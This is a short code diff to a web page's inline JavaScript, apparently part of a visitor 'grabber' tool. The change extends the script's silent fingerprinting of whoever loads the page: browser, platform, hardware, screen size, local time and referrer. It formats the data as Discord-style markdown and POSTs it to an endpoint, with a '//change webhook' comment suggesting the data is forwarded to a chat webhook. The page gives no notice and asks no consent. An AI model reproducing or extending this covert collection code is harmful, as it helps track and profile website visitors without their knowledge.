@@ -20,7 +20,11 @@
 <script>
 var x = document.getElementById("demo");
 
-var sysinfo = (" GET " , "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies Enabled: " + navigator.cookieEnabled + "\nBrowser Language: " + navigator.language + "\nBrowser Name: "+ navigator.appName + "\nBrowser CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU cores: " + navigator.hardwareConcurrency + "\nOscpu: " + navigator.oscpu + "```");
+let datetime = new Date();
+let localtime = String(datetime.toLocaleTimeString());
+
+
+var sysinfo = (" GET " , "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: "+ navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
 
 const request = new XMLHttpRequest();
     request.open("POST", "/location_update"); //change webhook
